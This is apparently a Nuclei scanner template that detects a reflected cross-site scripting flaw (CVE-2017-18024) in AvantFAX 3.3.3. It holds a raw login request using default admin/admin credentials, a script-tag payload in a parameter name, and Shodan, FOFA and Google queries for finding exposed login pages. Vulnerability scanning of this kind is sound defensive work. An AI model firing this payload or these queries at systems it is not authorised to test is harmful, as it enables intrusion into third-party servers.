http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <script>alert("{{randstr}}")</script>
    - AvantFAX
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username=admin&password=admin&_submit_check=1&jlbqg<script>alert("{{randstr}}")</script>b7g0x=1

    '
id: CVE-2017-18024
info:
  author: pikpikcu
  classification:
    cpe: cpe:2.3:a:avantfax:avantfax:3.3.3:*:*:*:*:*:*:*
    cve-id: CVE-2017-18024
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.91646
    epss-score: 0.07772
  description: AvantFAX 3.3.3 contains a cross-site scripting vulnerability via an
    arbitrary parameter name submitted to the default URL, as demonstrated by a parameter
    whose name contains a SCRIPT element and whose value is 1.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, leading
    to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    fofa-query: title="avantfax - login"
    google-query: intitle:"avantfax - login"
    max-request: 1
    product: avantfax
    shodan-query: http.title:"avantfax - login"
    vendor: avantfax
  name: AvantFAX 3.3.3 - Cross-Site Scripting
  reference:
  - https://hackerone.com/reports/963798
  - http://packetstormsecurity.com/files/145776/AvantFAX-3.3.3-Cross-Site-Scripting.html
  - https://nvd.nist.gov/vuln/detail/CVE-2017-18024
  - https://github.com/ARPSyndicate/kenzer-templates
  - https://github.com/NarbehJackson/Java-Xss-minitwit16
  remediation: 'Upgrade to a patched version of AvantFAX or apply the necessary security
    patches to mitigate the XSS vulnerability.

    '
  severity: medium
  tags: cve,cve2017,avantfax,hackerone,packetstorm,xss,vuln
